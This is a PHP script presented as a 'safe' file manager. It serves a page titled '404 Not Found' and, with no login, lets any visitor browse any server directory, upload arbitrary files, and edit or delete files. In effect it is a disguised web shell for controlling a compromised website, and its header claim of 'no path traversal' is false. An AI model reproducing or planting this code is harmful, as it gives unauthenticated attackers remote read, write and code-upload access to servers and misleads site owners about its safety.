<?php
/* =====================================================
   SAFE PHP FILE MANAGER
   - Anti 0 KB write
   - Safe edit / upload / delete
   - No directory delete
   - No path traversal
===================================================== */

error_reporting(E_ALL);
ini_set('display_errors', 1);

/* ================= PATH ================= */
$cwd = getcwd();
if (isset($_GET['p'])) {
    $real = realpath($_GET['p']);
    if ($real !== false && is_dir($real)) {
        $cwd = $real;
    }
}

/* ================= BREADCRUMB ================= */
function nav(string $dir): string {
    $parts = explode(DIRECTORY_SEPARATOR, $dir);
    $path = '';
    $out  = [];

    foreach ($parts as $p) {
        if ($p === '') continue;
        $path .= DIRECTORY_SEPARATOR . $p;
        $out[] = '<a href="?p=' . urlencode($path) . '">' . htmlspecialchars($p) . '</a>';
    }
    return implode(' / ', $out);
}

/* ================= MESSAGE ================= */
$msg = '';

/* ================= SAVE FILE (ANTI 0 KB) ================= */
if (isset($_POST['save'], $_POST['file'], $_POST['content'])) {

    $file   = basename($_POST['file']);
    $target = $cwd . DIRECTORY_SEPARATOR . $file;

    if (is_file($target) && is_writable($target)) {

        $tmp = $target . '.tmp_' . uniqid('', true);
        $bytes = file_put_contents($tmp, $_POST['content'], LOCK_EX);

        if ($bytes !== false && filesize($tmp) > 0) {
            rename($tmp, $target);
            $msg = 'File saved successfully.';
        } else {
            @unlink($tmp);
            $msg = 'Write failed. File NOT modified.';
        }
    } else {
        $msg = 'File not writable.';
    }
}

/* ================= UPLOAD ================= */
if (!empty($_FILES['upload']['name'])) {

    if ($_FILES['upload']['error'] === UPLOAD_ERR_OK) {

        $name = basename($_FILES['upload']['name']);
        $dest = $cwd . DIRECTORY_SEPARATOR . $name;

        if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
            $msg = 'Upload successful.';
        } else {
            $msg = 'Upload failed.';
        }
    } else {
        $msg = 'Upload error.';
    }
}

/* ================= DELETE FILE ================= */
if (isset($_POST['delete'], $_POST['file'])) {

    $file   = basename($_POST['file']);
    $target = $cwd . DIRECTORY_SEPARATOR . $file;

    if (is_file($target) && is_writable($target)) {
        if (unlink($target)) {
            $msg = 'File deleted successfully.';
        } else {
            $msg = 'Delete failed.';
        }
    } else {
        $msg = 'File not deletable.';
    }
}
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title> 404 Not Found </title>
<style>
body { background:#111;color:#eee;font-family:Arial;font-size:14px }
a { color:#6cf;text-decoration:none }
textarea,input { background:#222;color:#eee;border:1px solid #444 }
ul { list-style:none;padding-left:0 }
li { margin:4px 0 }
.msg { color:#9f9;margin:10px 0 }
</style>
</head>
<body>

<h3>PATH: <?= nav($cwd); ?></h3>

<?php if ($msg): ?>
<div class="msg"><?= htmlspecialchars($msg); ?></div>
<?php endif; ?>

<form method="post" enctype="multipart/form-data">
<input type="file" name="upload">
<input type="submit" value="Upload">
</form>

<hr>

<?php
/* ================= EDIT MODE ================= */
if (isset($_GET['e'])) {

    $file = basename($_GET['e']);
    $path = $cwd . DIRECTORY_SEPARATOR . $file;

    if (is_file($path) && is_readable($path)) {

        $content = htmlspecialchars(file_get_contents($path));
        ?>
        <form method="post">
            <textarea name="content" rows="20" cols="100"><?= $content ?></textarea><br>
            <input type="hidden" name="file" value="<?= htmlspecialchars($file) ?>">
            <input type="submit" name="save" value="Save">
        </form>
        <hr>
        <?php
    }
}

/* ================= FILE LIST ================= */
$h = opendir($cwd);
echo '<ul>';

while (($i = readdir($h)) !== false) {

    if ($i === '.') continue;
    $p = $cwd . DIRECTORY_SEPARATOR . $i;

    if (is_dir($p)) {

        echo '<li>[+] <a href="?p=' . urlencode($p) . '">' . htmlspecialchars($i) . '</a></li>';

    } else {

        echo '<li>[-] ' . htmlspecialchars($i) . '
            <a href="?e=' . urlencode($i) . '&p=' . urlencode($cwd) . '">[edit]</a>

            <form method="post" style="display:inline"
                onsubmit="return confirm(\'Delete file ' . htmlspecialchars($i) . '?\')">
                <input type="hidden" name="file" value="' . htmlspecialchars($i) . '">
                <input type="submit" name="delete" value="delete">
            </form>
        </li>';
    }
}

closedir($h);
echo '</ul>';
?>

</body>
</html>
